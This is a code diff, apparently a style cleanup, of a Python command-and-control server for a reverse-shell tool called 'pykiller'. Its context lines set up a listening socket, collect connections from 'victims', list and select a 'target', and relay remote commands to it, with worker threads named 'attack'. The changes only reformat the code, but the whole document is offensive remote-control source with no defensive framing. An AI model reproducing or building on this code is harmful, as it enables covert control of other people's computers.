@@ -23,6 +23,7 @@ queue = Queue()
 all_connections = []
 all_addresses = []
 
+
 # Create socket (allows two computers to connect)
 def socket_create():
     try:
@@ -34,6 +35,7 @@ def socket_create():
         s = socket.socket()
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
+
 
 def socket_bind():
     try:
@@ -48,6 +50,7 @@ def socket_bind():
         time.sleep(5)
         socket_bind()
 
+
 # Accept connections from multiple clients and save to list
 def accept_connections():
     for c in all_connections:
@@ -60,12 +63,14 @@ def accept_connections():
             conn.setblocking(1)
             client_hostname = conn.recv(1024).decode("utf-8")
             address = address + (client_hostname,)
-            #all_addresses.append(address)
+            # all_addresses.append(address)
             all_connections.append(conn)
             all_addresses.append(address)
-            print(colored("\nConnection has beesn established: ", 'green') + address[0])
+            print(colored("\nConnection has beesn established: ", 'green') 
+                  + address[0])
         except:
             print("Erro accepting connections")
+
 
 # Interactive prompt for sending commands remotely
 def start_pykiller():
@@ -80,6 +85,7 @@ def start_pykiller():
         else:
             print(colored("Command not recognized", 'yellow'))
 
+
 # Display all current connections
 def list_connections():
     results = ''
@@ -91,8 +97,10 @@ def list_connections():
             del all_connections[i]
             del all_addresses[i]
             continue
-        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
+        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' \
+                   + str(all_addresses[i][1]) + '\n'
     print(colored('+++++ Clients List +++++', 'blue') + '\n' + results)
+
 
 # Select a target Client
 def get_target(cmd):
@@ -100,14 +108,16 @@ def get_target(cmd):
         target = cmd.replace('select ', '')
         target = int(target)
         conn = all_connections[target]
-        print(colored("You are now connected to ", 'green') + str(all_addresses[target][0]))
+        print(colored("You are now connected to ", 'green') 
+              + str(all_addresses[target][0]))
         print(str(all_addresses[target][0]) + '> ', end="")
         return conn
     except:
         print(colored("Not a valid selection", 'red'))
         return None
 
-    # Connect with remote target client
+
+# Connect with remote target client
 def send_target_commands(conn):
     while True:
         try:
@@ -122,12 +132,14 @@ def send_target_commands(conn):
             print("Connection was lost")
             break
 
+
 # Create victim threads
 def create_victims():
     for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=attack)
         t.daemon = True
         t.start()
+
 
 def attack():
     while True:
@@ -139,6 +151,7 @@ def attack():
         if x == 2:
             start_pykiller()
         queue.task_done()
+
 
 def create_jobs():
     for x in JOB__NUMBER:
